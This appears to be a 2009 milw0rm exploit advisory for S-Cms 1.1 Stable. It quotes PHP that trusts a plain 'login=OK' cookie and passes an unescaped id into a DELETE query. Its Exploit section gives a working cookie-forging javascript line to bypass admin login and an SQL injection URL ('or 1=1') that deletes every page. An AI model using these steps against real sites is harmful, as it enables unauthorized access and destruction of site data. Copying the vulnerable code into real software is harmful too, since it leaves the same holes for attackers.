@@ -1,0 +1,57 @@
+#########################################################################################
+[0x01] Informations:
+
+Name           : S-Cms 1.1 Stable 
+Download       : http://www.hotscripts.com/listings/jump/download/87992/
+Vulnerability  : Insecure Cookie Handling / Mass Page Delete
+Author         : x0r
+Contact        : andry2000@hotmail.it
+Notes          : Proud to be Italian 
+#########################################################################################
+[0x02] Bug:
+
+Bugged file is /[path]/login_action.php ... /admin/delete_page.php
+
+[Code]
+
+$user=$_POST['username'];
+$pass=$_POST['password'];
+
+$select_admin = mysql_query("SELECT * FROM cms_admin");
+
+while($dati_admin=mysql_fetch_array($select_admin)){
+$username=$dati_admin['username'];
+$password=$dati_admin['password'];
+}
+
+if ($user == $username && $pass == $password){
+ 
+   setcookie("login", "OK", time() + $logintime); #0wn3d
+
+[/code]
+
+[CODE]
+	
+		$id=$_GET['id'];
+		
+		$delete=mysql_query("DELETE FROM cms_content WHERE id='$id'");
+		
+		
+		if ($delete){
+		
+		echo ""._DELETE_PAGE_SUCCESS."";
+		
+		} else {
+		
+		echo ""._DELETE_PAGE_ERROR."";
+[/code]
+
+#########################################################################################
+[0x03] Exploit:
+
+Exploit: 1- javascript:document.cookie = "login=OK; path=/"
+         2- http://[victim].org/path/admin/delete_page.php?id=' or 1=1/*
+
+########################################################################################
+
+# milw0rm.com [2009-02-17]
